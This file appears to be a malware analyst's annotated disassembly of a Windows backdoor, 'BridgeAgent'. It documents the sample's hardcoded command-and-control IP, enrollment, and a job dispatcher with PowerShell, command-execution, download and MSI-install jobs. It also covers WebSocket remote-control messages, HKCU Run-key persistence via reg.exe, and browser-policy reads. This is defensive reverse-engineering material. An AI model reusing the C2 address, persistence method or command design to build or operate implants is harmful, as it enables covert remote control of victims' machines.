@@ -1,0 +1,414 @@
+# BridgeAgent backdoor: annotated disassembly excerpts (objdump, Intel syntax)
+# sample c4545d48db19349484d97681beaa8832f25663250db0e5ff16ef36e9e8ea8766, VAs, read-only
+# "..." = 48-byte preview of the RIP-relative target; imm="..." = ASCII of an immediate.
+# Calls through 0x14058b600/0x14058b608 (GetProcessHeap/HeapFree) are filtered out where marked.
+
+### D1 default server builder 0x1401f3ad0 (14 bytes: '93.152.2' at +0, '.213.149' at +6)
+
+   1401f3ad0:	push   rsi
+   1401f3ad1:	sub    rsp,0x20
+   1401f3ad5:	mov    rsi,rcx
+   1401f3ad8:	mov    edx,0xe
+   1401f3add:	xor    ecx,ecx
+   1401f3adf:	call   0x1403bf7a0
+   1401f3ae4:	test   rax,rax
+   1401f3ae7:	je     0x1401f3b1d
+   1401f3ae9:	movabs rcx,0x3934312e3331322e   imm=".213.149"
+   1401f3af3:	mov    QWORD PTR [rax+0x6],rcx
+   1401f3af7:	movabs rcx,0x322e3235312e3339   imm="93.152.2"
+   1401f3b01:	mov    QWORD PTR [rax],rcx
+   1401f3b04:	mov    QWORD PTR [rsi],0xe
+   1401f3b0b:	mov    QWORD PTR [rsi+0x8],rax
+   1401f3b0f:	mov    QWORD PTR [rsi+0x10],0xe
+   1401f3b17:	add    rsp,0x20
+   1401f3b1b:	pop    rsi
+   1401f3b1c:	ret
+
+### D2 server_ip read from configuration, default applied when missing (0x1402b4236..0x1402b43b0, filtered)
+
+   1402b4236:	lea    r8,[rip+0x2dbe6f]        # 0x1405900ac   "server_ipnonceissued_atexpires_atca_pemca_sha256"
+   1402b423d:	lea    rcx,[rbp+0xb0]
+   1402b4244:	lea    rdx,[rbp+0x40]
+   1402b4248:	mov    r9d,0x9
+   1402b424e:	call   0x1401e5650
+   1402b4253:	nop
+   1402b4254:	mov    rax,QWORD PTR [rbp+0xb0]
+   1402b425b:	test   rax,rax
+   1402b425e:	je     0x1402b43b6
+   1402b4264:	cmp    rax,0xffffffffffffffff
+   1402b4268:	je     0x1402b42f6
+   1402b426e:	mov    rdi,QWORD PTR [rbp+0xb8]
+   1402b4275:	cmp    rax,0xfffffffffffffffe
+   1402b4279:	jne    0x1402b436b
+   1402b427f:	mov    QWORD PTR [rbx],rdi
+   1402b4282:	jmp    0x1402b41fe
+   1402b4287:	lea    rcx,[rip+0x322fa2]        # 0x1405d7230   ".q]@...._.......!........Unsupported value ".."."
+   1402b428e:	call   0x140581960
+   1402b4293:	nop
+   1402b4294:	ud2
+   1402b4296:	mov    rdx,QWORD PTR [rbp+0x50]
+   1402b429a:	mov    rcx,rbp
+   1402b429d:	mov    r8d,eax
+   1402b42a0:	call   0x140585b40
+   1402b42a5:	nop
+   1402b42a6:	mov    rax,QWORD PTR [rbp+0x0]
+   1402b42aa:	inc    QWORD PTR [rbp+0x40]
+   1402b42ae:	cmp    rax,0xffffffffffffffff
+   1402b42b2:	je     0x1402b4026
+   1402b42b8:	movups xmm0,XMMWORD PTR [rbp+0x0]
+   1402b42bc:	movups xmm1,XMMWORD PTR [rbp+0x10]
+   1402b42c0:	movups xmm2,XMMWORD PTR [rbp+0x20]
+   1402b42c4:	movups xmm3,XMMWORD PTR [rbp+0x30]
+   1402b42c8:	movaps XMMWORD PTR [rbp+0xe0],xmm3
+   1402b42cf:	movaps XMMWORD PTR [rbp+0xd0],xmm2
+   1402b42d6:	movaps XMMWORD PTR [rbp+0xc0],xmm1
+   1402b42dd:	movaps XMMWORD PTR [rbp+0xb0],xmm0
+   1402b42e4:	lea    rcx,[rbp+0xb0]
+   1402b42eb:	call   0x140580f10
+   1402b42f0:	nop
+   1402b42f1:	jmp    0x1402b41fb
+   1402b42f6:	lea    rcx,[rbp+0xb0]
+   1402b42fd:	call   0x1401f3ad0
+   1402b4302:	nop
+   1402b4303:	mov    r9,QWORD PTR [rbp+0xb8]
+   1402b430a:	mov    rax,QWORD PTR [rbp+0xc0]
+   1402b4311:	mov    QWORD PTR [rsp+0x20],rax
+   1402b4316:	lea    rdx,[rip+0x2dbd8f]        # 0x1405900ac   "server_ipnonceissued_atexpires_atca_pemca_sha256"
+   1402b431d:	lea    rcx,[rbp+0x40]
+   1402b4321:	mov    r8d,0x9
+   1402b4327:	mov    QWORD PTR [rbp+0xf8],r9
+   1402b432e:	call   0x1401e5960
+   1402b4333:	nop
+   1402b4334:	test   rax,rax
+   1402b4337:	je     0x1402b4381
+   1402b4339:	mov    QWORD PTR [rbx],rax
+   1402b433c:	mov    BYTE PTR [rbx+0x68],0xff
+   1402b4340:	cmp    QWORD PTR [rbp+0xb0],0x0
+   1402b4348:	je     0x1402b4202
+   1402b4354:	mov    rcx,rax
+   1402b4357:	xor    edx,edx
+   1402b4359:	mov    r8,QWORD PTR [rbp+0xf8]
+   1402b4366:	jmp    0x1402b4202
+   1402b4371:	mov    rcx,rax
+   1402b4374:	xor    edx,edx
+   1402b4376:	mov    r8,rdi
+   1402b437f:	jmp    0x1402b43b6
+   1402b4381:	cmp    QWORD PTR [rbp+0xb0],0x0
+   1402b4389:	je     0x1402b43a4
+   1402b4391:	mov    rcx,rax
+   1402b4394:	xor    edx,edx
+   1402b4396:	mov    r8,QWORD PTR [rbp+0xf8]
+   1402b43a3:	nop
+   1402b43a4:	lea    rcx,[rip+0x2eee52]        # 0x1405a31fd   "configuration.default_server.appliedmissing serv"
+   1402b43ab:	mov    edx,0x24
+   1402b43b0:	call   0x1402b4bc0
+   1402b43b5:	nop
+
+### D3 configuration lookup helper 0x1401e5650
+
+   1401e5650:	push   rbp
+   1401e5651:	push   rsi
+   1401e5652:	sub    rsp,0x168
+   1401e5659:	lea    rbp,[rsp+0x80]
+   1401e5661:	mov    QWORD PTR [rbp+0xe0],0xfffffffffffffffe
+   1401e566c:	mov    rsi,rcx
+   1401e566f:	mov    QWORD PTR [rbp-0x20],r8
+   1401e5673:	mov    QWORD PTR [rbp-0x18],r9
+   1401e5677:	lea    r8,[rip+0x3b541a]        # 0x14059aa98   "SELECT value FROM configuration WHERE key=?INSER"
+   1401e567e:	lea    rcx,[rbp+0x48]
+   1401e5682:	mov    r9d,0x2b
+   1401e5688:	call   0x1401d4210
+   1401e568d:	mov    eax,DWORD PTR [rbp+0x48]
+
+### D4 enrollment bootstrap: server_ip lookup and log (0x1400d64fc..0x1400d65d5)
+
+   1400d64fc:	lea    rcx,[rip+0x4bdbe1]        # 0x1405940e4   "enrollment.bootstrap.begin.enrollment.server=..."
+   1400d6503:	mov    edx,0x1a
+   1400d6508:	call   0x1402b4bc0
+   1400d650d:	nop
+   1400d650e:	mov    rax,QWORD PTR [rbp+0x26e0]
+   1400d6515:	mov    rdx,QWORD PTR [rax+0x338]
+   1400d651c:	mov    QWORD PTR [rbp+0x2398],r15
+   1400d6523:	mov    rax,QWORD PTR [rbp+0x26d0]
+   1400d652a:	mov    QWORD PTR [rbp+0x2390],rax
+   1400d6531:	lea    r8,[rip+0x4b9b74]        # 0x1405900ac   "server_ipnonceissued_atexpires_atca_pemca_sha256"
+   1400d6538:	lea    rcx,[rbp-0x50]
+   1400d653c:	mov    r9d,0x9
+   1400d6542:	call   0x1401e5650
+   1400d6547:	nop
+   1400d6548:	mov    rax,QWORD PTR [rbp-0x50]
+   1400d654c:	mov    rcx,QWORD PTR [rbp-0x48]
+   1400d6550:	mov    QWORD PTR [rbp+0x26d8],rcx
+   1400d6557:	cmp    rax,0xfffffffffffffffe
+   1400d655b:	je     0x1400d8386
+   1400d6561:	cmp    rax,0xffffffffffffffff
+   1400d6565:	mov    r8,QWORD PTR [rbp+0x26e0]
+   1400d656c:	je     0x1400d8336
+   1400d6572:	mov    rcx,QWORD PTR [rbp-0x40]
+   1400d6576:	lea    rdx,[r8+0x340]
+   1400d657d:	mov    QWORD PTR [r8+0x340],rax
+   1400d6584:	mov    rax,QWORD PTR [rbp+0x26d8]
+   1400d658b:	mov    QWORD PTR [r8+0x348],rax
+   1400d6592:	mov    QWORD PTR [r8+0x350],rcx
+   1400d6599:	mov    QWORD PTR [rbp+0x23b0],rdx
+   1400d65a0:	lea    rax,[rip+0x1e60a9]        # 0x1402bc650
+   1400d65a7:	mov    QWORD PTR [rbp+0x23b8],rax
+   1400d65ae:	mov    QWORD PTR [rbp+0x23a8],r15
+   1400d65b5:	mov    rax,QWORD PTR [rbp+0x26d0]
+   1400d65bc:	mov    QWORD PTR [rbp+0x23a0],rax
+   1400d65c3:	lea    rdx,[rip+0x4bdb34]        # 0x1405940fe   ".enrollment.server=.......0.X@................Q."
+   1400d65ca:	lea    rcx,[rbp-0x50]
+   1400d65ce:	lea    r8,[rbp+0x23b0]
+   1400d65d5:	call   0x1402db650
+
+### D5 enrollment token lookup (key length 0x10) and installation_id store
+
+   1400d8cf2:	lea    r8,[rip+0x4b73ec]        # 0x1405900e5   "enrollment_tokeninstallation_idownercountryosage"
+   1400d8cf9:	lea    rcx,[rbp-0x50]
+   1400d8cfd:	mov    r9d,0x10
+   1400d8d03:	call   0x1401e5650
+   1400d8eb5:	lea    rdx,[rip+0x4bb2a3]        # 0x14059415f   ".install_...identity.profile owner=.. country=.."
+   1400d8ec7:	call   0x1402b6020
+   1400d8f21:	lea    rdx,[rip+0x4b71cd]        # 0x1405900f5   "installation_idownercountryosagent_versionpublic"
+   1400d8f28:	mov    r8d,0xf
+   1400d8f35:	call   0x1401e5960
+
+### D6 job dispatcher (0x1400ef74b..0x1400effc7, filtered)
+
+   1400ef74b:	cmp    rax,0x9
+   1400ef769:	movabs rax,0x73696c2e656c6966   imm="file.lis"
+   1400ef788:	movabs rax,0x6174732e656c6966   imm="file.sta"
+   1400ef7a7:	movabs rax,0x766f6d2e656c6966   imm="file.mov"
+   1400ef7c6:	movabs rax,0x706f632e656c6966   imm="file.cop"
+   1400ef7e5:	movabs rax,0x7361682e656c6966   imm="file.has"
+   1400ef808:	movabs rax,0x65722e746e656761   imm="agent.re"
+   1400ef815:	movabs rdx,0x747261747365722e   imm=".restart"
+   1400ef82c:	movabs rax,0x776f642e656c6966   imm="file.dow"
+   1400ef839:	movabs rdx,0x64616f6c6e776f64   imm="download"
+   1400ef850:	movabs rax,0x2e646567616e616d   imm="managed."
+   1400ef85d:	movabs rdx,0x796c7070612e6465   imm="ed.apply"
+   1400ef885:	pcmpeqb xmm0,XMMWORD PTR [rip+0x49c653]        # 0x14058bee0   "file.upload.commit..............script-powershel"
+   1400ef88d:	pcmpeqb xmm1,XMMWORD PTR [rip+0x49c65b]        # 0x14058bef0   "it..............script-powershell..............."
+   1400ef89d:	cmp    eax,0xffff
+   1400ef8dd:	movabs rax,0x6972642e656c6966   imm="file.dri"
+   1400ef8ea:	movabs r8,0x7365766972642e65   imm="e.drives"
+   1400ef901:	movabs rax,0x6e65722e656c6966   imm="file.ren"
+   1400ef90e:	movabs r8,0x656d616e65722e65   imm="e.rename"
+   1400ef925:	movabs rax,0x6c65642e656c6966   imm="file.del"
+   1400ef932:	movabs r8,0x6574656c65642e65   imm="e.delete"
+   1400ef949:	movabs rax,0x2e6c6c6174736e69   imm="install."
+   1400ef956:	movabs rdx,0x69736d2e6c6c6174   imm="tall.msi"
+   1400ef983:	lea    rdx,[rip+0x4ed2cd]        # 0x1405dcc57   "error..:..:.... (os error ..).NotReadingReadingR"
+   1400ef991:	mov    r8d,0x5
+   1400ef997:	call   0x1402bc5f0
+   1400ef9a4:	lea    rdx,[rip+0x4a2ed5]        # 0x140592880   "machine-wide MSI installation requires elevation"
+   1400ef9b2:	mov    r8d,0x30
+   1400ef9b8:	call   0x140018930
+   1400ef9be:	cmp    BYTE PTR [rbx+0x100],0xff
+   1400efa0e:	call   0x1401e3370
+   1400efa14:	cmp    BYTE PTR [rbx+0x100],0xff
+   1400efa24:	call   0x140045540
+   1400efa2a:	lea    rdx,[rip+0x4a2e2b]        # 0x14059285c   "job_type....0.X@............!)......machine-wide"
+   1400efa38:	mov    r8d,0x8
+   1400efa3e:	call   0x1402bc5f0
+   1400efa62:	call   0x140018930
+   1400efa68:	cmp    BYTE PTR [rbx+0x100],0xff
+   1400efab8:	call   0x1401e3370
+   1400efabe:	cmp    BYTE PTR [rbx+0x100],0xff
+   1400eface:	call   0x140045540
+   1400efad4:	lea    rdx,[rip+0x4a2dd5]        # 0x1405928b0   "requires_elevationremove_filesfile......0.X@...."
+   1400efae2:	mov    r8d,0x12
+   1400efae8:	call   0x1402bc5f0
+   1400efb13:	call   0x1401e3370
+   1400efb19:	cmp    BYTE PTR [rbx+0x4f0],0xff
+   1400efb29:	call   0x140045540
+   1400efb83:	call   0x1402c3300
+   1400efbc8:	call   0x1401fdc40
+   1400efbdc:	cmp    rax,0xffffffffffffffff
+   1400efc33:	call   0x140213a90
+   1400efc3e:	movabs rax,0x2e646567616e616d   imm="managed."
+   1400efc4e:	xor    rcx,0x706f7473   imm="stop"
+   1400efc73:	call   0x140208e20
+   1400efc80:	cmp    al,0xff
+   1400efcdf:	call   0x1401e7b00
+   1400efcee:	pcmpeqb xmm0,XMMWORD PTR [rip+0x49c22a]        # 0x14058bf20   "software.installinventory.collect..............."
+   1400efcfa:	cmp    eax,0xffff
+   1400efd2e:	movabs rax,0x646b6d2e656c6966   imm="file.mkd"
+   1400efd40:	xor    r8,0x7269   imm="ir"
+   1400efd50:	call   0x140001540
+   1400efd70:	call   0x1402c3300
+   1400efd83:	call   0x1402c5e30
+   1400efdcc:	call   0x140052370
+   1400efde2:	movabs rax,0x652e747069726373   imm="script.e"
+   1400efdef:	movabs rdx,0x657475636578652e   imm=".execute"
+   1400efe06:	movabs rax,0x2e646567616e616d   imm="managed."
+   1400efe16:	movabs r8,0x7269617065722e64   imm="d.repair"
+   1400efe30:	movabs rdx,0x65766f6d65722e64   imm="d.remove"
+   1400efe4e:	lea    rcx,[rip+0x4a2a6d]        # 0x1405928c2   "remove_filesfile......0.X@.............)......0."
+   1400efe5a:	call   0x1403b4ba0
+   1400efe64:	cmp    BYTE PTR [rax],0x1
+   1400efe6e:	cmp    r9b,0x2
+   1400efe8d:	call   0x140208e20
+   1400efe9a:	cmp    al,0xff
+   1400efef9:	call   0x1401e7b00
+   1400eff04:	movabs rax,0x6572617774666f73   imm="software"
+   1400eff11:	movabs rdx,0x796f6c7065642e65   imm="e.deploy"
+   1400eff28:	movabs rax,0x2e646e616d6d6f63   imm="command."
+   1400eff35:	movabs rdx,0x657475636578652e   imm=".execute"
+   1400eff6d:	pcmpeqb xmm0,XMMWORD PTR [rip+0x49bfbb]        # 0x14058bf30   "inventory.collect...............ult.acknowledged"
+   1400eff75:	pcmpeqb xmm1,XMMWORD PTR [rip+0x49bfc3]        # 0x14058bf40   "t...............ult.acknowledgedresult.acknowled"
+   1400eff85:	cmp    eax,0xffff
+   1400effa6:	lea    rdx,[rip+0x4eccaa]        # 0x1405dcc57   "error..:..:.... (os error ..).NotReadingReadingR"
+   1400effb4:	mov    r8d,0x5
+   1400effba:	call   0x1402bc5f0
+   1400effc7:	lea    rdx,[rip+0x4a287a]        # 0x140592848   "unsupported job typejob_type....0.X@............"
+
+### D7 WebSocket server message dispatcher (filtered)
+
+   140128f56:	movabs rcx,0x772e726576726573   imm="server.w"
+   140128f63:	movabs rdx,0x656d6f636c65772e   imm=".welcome"
+   140129020:	movabs rax,0x697373612e626f6a   imm="job.assi"
+   140129033:	xor    rcx,0x6e67   imm="gn"
+   14012935e:	movabs rax,0x632e65746f6d6572   imm="remote.c"
+   140129370:	xor    rcx,0x65736f6c   imm="lose"
+   140129456:	pcmpeqb xmm1,XMMWORD PTR [rip+0x462af2]        # 0x14058bf50   "ult.acknowledgedresult.acknowleddged............"
+   14012945e:	pcmpeqb xmm0,XMMWORD PTR [rip+0x462afa]        # 0x14058bf60   "result.acknowleddged............message.acknowle"
+   14012946b:	movabs rax,0x6f2e65746f6d6572   imm="remote.o"
+   140129479:	movabs rcx,0x6e65706f2e65746f   imm="ote.open"
+   1401294fd:	pcmpeqb xmm1,XMMWORD PTR [rip+0x462a6b]        # 0x14058bf70   "dged............message.acknowle................"
+   140129505:	pcmpeqb xmm0,XMMWORD PTR [rip+0x462a73]        # 0x14058bf80   "message.acknowle................ss.control_probe"
+   1401295f2:	pcmpeqb xmm1,XMMWORD PTR [rip+0x4629d6]        # 0x14058bfd0   "forensics.configserver.forensicsbrowser.profiles"
+   1401295fa:	pcmpeqb xmm0,XMMWORD PTR [rip+0x4629de]        # 0x14058bfe0   "server.forensicsbrowser.profiles.consent.request"
+   140129787:	movabs rax,0x612e65746f6d6572   imm="remote.a"
+   140129795:	movabs rcx,0x6863617474612e65   imm="e.attach"
+   1401297ac:	movabs rax,0x642e65746f6d6572   imm="remote.d"
+   1401297ba:	movabs rcx,0x6863617465642e65   imm="e.detach"
+   1401298a9:	movabs rax,0x772e726576726573   imm="server.w"
+   1401298b7:	movabs rcx,0x656d6f636c65772e   imm=".welcome"
+   1401298ce:	movabs rax,0x632e65746f6d6572   imm="remote.c"
+   1401298dc:	movabs rcx,0x646e616d6d6f632e   imm=".command"
+   1401299c9:	pcmpeqb xmm1,XMMWORD PTR [rip+0x4625cf]        # 0x14058bfa0   "ss.control_probeserver.liveness.veness.challenge"
+   1401299df:	pcmpeqb xmm1,XMMWORD PTR [rip+0x4625d9]        # 0x14058bfc0   "veness.challengeforensics.configserver.forensics"
+   1401299e7:	pcmpeqb xmm0,XMMWORD PTR [rip+0x4625c1]        # 0x14058bfb0   "server.liveness.veness.challengeforensics.config"
+
+### D8 WebSocket URL pieces
+
+   14010fef6:	lea    rax,[rip+0x483b6b]        # 0x140593a68   "/api/agent/connect.wss://...#connection.websocke"
+   140110035:	lea    rdx,[rip+0x483a3e]        # 0x140593a7a   ".wss://...#connection.websocket.handshake url=.."
+
+### D9 data root %LOCALAPPDATA%\Bridge, logs\bridge-agent.log (filtered)
+
+   1401bc343:	lea    rdx,[rip+0x3dff8f]        # 0x14059c2d9   "LOCALAPPDATA${roaming_app_data}${profile}USERPRO"
+   1401bc351:	mov    r8d,0xc
+   1401bc357:	call   0x1403d7560
+   1401bc39a:	call   0x1403bf7a0
+   1401bc3b4:	call   0x140578a00
+   1401bc3dc:	lea    rdx,[rip+0x3e0680]        # 0x14059ca63   "BridgeBridgeAgent.exeterminal.replay.starttermin"
+   1401bc3ea:	mov    r8d,0x6
+   1401bc3f0:	call   0x1403c5fd0
+   1401bc4cb:	lea    rdx,[rip+0x3d5be1]        # 0x1405920b3   "logsopening agent databasedatabase.open.readyenr"
+   1401bc4d9:	mov    r8d,0x4
+   1401bc4df:	call   0x1403c5fd0
+   1401bc6f8:	lea    rdx,[rip+0x3de716]        # 0x14059ae15   "bridge-agent.log.creating ConPTY pipes: ..%confi"
+
+### D10 canonical path %LOCALAPPDATA%\Programs\Bridge\BridgeAgent.exe (filtered)
+
+   14022879c:	lea    rdx,[rip+0x373b36]        # 0x14059c2d9   "LOCALAPPDATA${roaming_app_data}${profile}USERPRO"
+   1402287a7:	mov    r8d,0xc
+   1402287ad:	call   0x1403d7560
+   1402287de:	call   0x1403bf7a0
+   1402287f8:	call   0x140578a00
+   140228814:	lea    rdx,[rip+0x372a9f]        # 0x14059b2ba   "ProgramsStartup.......0.X@.............-......wp"
+   14022881f:	mov    r8d,0x8
+   140228825:	call   0x1403c5fd0
+   140228849:	call   0x1403bf7a0
+   140228863:	call   0x140578a00
+   14022887f:	lea    rdx,[rip+0x3741dd]        # 0x14059ca63   "BridgeBridgeAgent.exeterminal.replay.starttermin"
+   14022888a:	mov    r8d,0x6
+   140228890:	call   0x1403c5fd0
+   1402288b4:	call   0x1403bf7a0
+   1402288ce:	call   0x140578a00
+   1402288ea:	lea    rdx,[rip+0x374178]        # 0x14059ca69   "BridgeAgent.exeterminal.replay.startterminal.rep"
+   1402288f5:	mov    r8d,0xf
+
+### D11 HKCU Run via reg.exe and legacy Startup cleanup (filtered)
+
+   140247192:	lea    rdx,[rip+0x3565af]        # 0x14059d748   ".".." --supervisor.startup.hkcu_run.ensureADDHKC"
+   1402471a4:	call   0x1402db650
+   1402471c7:	lea    rcx,[rip+0x35658d]        # 0x14059d75b   "startup.hkcu_run.ensureADDHKCU\Software\Microsof"
+   1402471d3:	call   0x1402b4bc0
+   1402471e0:	call   0x1403bf7a0
+   1402471ee:	mov    DWORD PTR [rax+0x3],0x6578652e   imm=".exe"
+   1402471f5:	mov    DWORD PTR [rax],0x2e676572   imm="reg."
+   1402472aa:	lea    rdx,[rip+0x3564c1]        # 0x14059d772   "ADDHKCU\Software\Microsoft\Windows\CurrentVersio"
+   1402472b8:	mov    r8d,0x3
+   1402472be:	call   0x1403c88b0
+   1402472c4:	lea    rdx,[rip+0x3564aa]        # 0x14059d775   "HKCU\Software\Microsoft\Windows\CurrentVersion\R"
+   1402472d2:	mov    r8d,0x32
+   1402472d8:	call   0x1403c88b0
+   1402472de:	lea    rdx,[rip+0x34cb1a]        # 0x140593dff   "/vInstallationPathREG_SZ.0.X@............,...6.."
+   1402472ec:	mov    r8d,0x2
+   1402472f2:	call   0x1403c88b0
+   1402472f8:	lea    rdx,[rip+0x3564a8]        # 0x14059d7a7   "BridgeAgent/t/d/fstartup.hkcu_run.ready.startup."
+   140247306:	mov    r8d,0xb
+   14024730c:	call   0x1403c88b0
+   140247312:	lea    rdx,[rip+0x356499]        # 0x14059d7b2   "/t/d/fstartup.hkcu_run.ready.startup.hkcu_run.fa"
+   140247320:	mov    r8d,0x2
+   140247326:	call   0x1403c88b0
+   14024732c:	lea    rdx,[rip+0x34cade]        # 0x140593e11   "REG_SZ.0.X@............,...6...root/Office16/OUT"
+   14024733a:	mov    r8d,0x6
+   140247340:	call   0x1403c88b0
+   140247346:	lea    rdx,[rip+0x356467]        # 0x14059d7b4   "/d/fstartup.hkcu_run.ready.startup.hkcu_run.fail"
+   140247354:	mov    r8d,0x2
+   14024735a:	call   0x1403c88b0
+   14024736e:	call   0x1403c88b0
+   140247374:	lea    rdx,[rip+0x35643b]        # 0x14059d7b6   "/fstartup.hkcu_run.ready.startup.hkcu_run.failed"
+   140247579:	lea    rdx,[rip+0x353d20]        # 0x14059b2a0   "APPDATAMicrosoftStart MenuProgramsStartup......."
+   140247657:	lea    rdx,[rip+0x353c49]        # 0x14059b2a7   "MicrosoftStart MenuProgramsStartup.......0.X@..."
+   1402476dd:	lea    rdx,[rip+0x34b284]        # 0x140592968   "Windows5.1.4....o)Y@............complianceUnknow"
+   140247766:	lea    rdx,[rip+0x353b43]        # 0x14059b2b0   "Start MenuProgramsStartup.......0.X@............"
+   1402477ec:	lea    rdx,[rip+0x353ac7]        # 0x14059b2ba   "ProgramsStartup.......0.X@.............-......wp"
+   140247872:	lea    rdx,[rip+0x353a49]        # 0x14059b2c2   "Startup.......0.X@.............-......wparammsga"
+   140247a3f:	lea    rdx,[rip+0x355dc2]        # 0x14059d808   "Dropbox.exestartup.legacy_dropbox_removed+startu"
+   140247b4e:	lea    rdx,[rip+0x355d0a]        # 0x14059d85f   "Bridge Agent.cmdstartup.folder.legacy_launcher_r"
+
+### D12 mutex prefix and supervisor/runtime switches (filtered)
+
+   14022e0f5:	lea    rdx,[rip+0x36ed1b]        # 0x14059ce17   ".bridge_auth_error=.. websocket_status=...Local\"
+   1401bd8d2:	movabs r9,0x7672657075732d2d   imm="--superv"
+   1401bd902:	xor    r10,0x726f7369   imm="isor"
+   1401bd915:	call   0x140247120
+   1401bd958:	lea    rcx,[rip+0x3de410]        # 0x14059bd6f   "--adopt-runtimelaunching Bridge Agent supervisor"
+   1401bd964:	call   0x14021fa50
+   1401bd97d:	call   0x1401fe090
+   1401bd99d:	call   0x1400a87a0
+   1401bd9ad:	lea    rcx,[rip+0x3dd815]        # 0x14059b1c9   "--supervisor-pidlaunching Bridge Agent runtimeIN"
+
+### D13 browser policy values read and logged, '<unset>' when absent (filtered)
+
+   1402911ea:	cmp    DWORD PTR [rax],0x65676465   imm="edge"
+   140291204:	lea    rdx,[rip+0x30d1c9]        # 0x14059e3d4   "StartupBoostEnabledBackgroundModeEnabledApplicat"
+   140291212:	mov    r8d,0x13
+   140291218:	call   0x140210d40
+   140291250:	mov    r8d,0x7
+   140291265:	call   0x1403bf7a0
+   140291273:	mov    DWORD PTR [rax+0x3],0x3e746573   imm="set>"
+   14029127a:	mov    DWORD PTR [rax],0x736e753c   imm="<uns"
+   14029129d:	lea    rdx,[rip+0x30d143]        # 0x14059e3e7   "BackgroundModeEnabledApplicationBoundEncryptionE"
+   1402912ab:	mov    r8d,0x15
+   1402912b1:	call   0x140210d40
+   1402912e6:	call   0x1403bf7a0
+   1402912f4:	mov    DWORD PTR [rax+0x3],0x3e746573   imm="set>"
+   1402912fb:	mov    DWORD PTR [rax],0x736e753c   imm="<uns"
+   14029131e:	lea    rdx,[rip+0x30d0d7]        # 0x14059e3fc   "ApplicationBoundEncryptionEnabled.backstage.edge"
+   14029132c:	mov    r8d,0x21
+   140291332:	call   0x140210d40
+   140291367:	call   0x1403bf7a0
+   140291375:	mov    DWORD PTR [rax+0x3],0x3e746573   imm="set>"
+   14029137c:	mov    DWORD PTR [rax],0x736e753c   imm="<uns"
+   14029139f:	lea    rdx,[rip+0x30aeef]        # 0x14059c295   "UserDataDiruserdatadir.....0.X@................%"
+   1402913ad:	mov    r8d,0xb
+   1402913b3:	call   0x140210d40
+   1402913e8:	call   0x1403bf7a0
+   1402913f6:	mov    DWORD PTR [rax+0x3],0x3e746573   imm="set>"
+   1402913fd:	mov    DWORD PTR [rax],0x736e753c   imm="<uns"
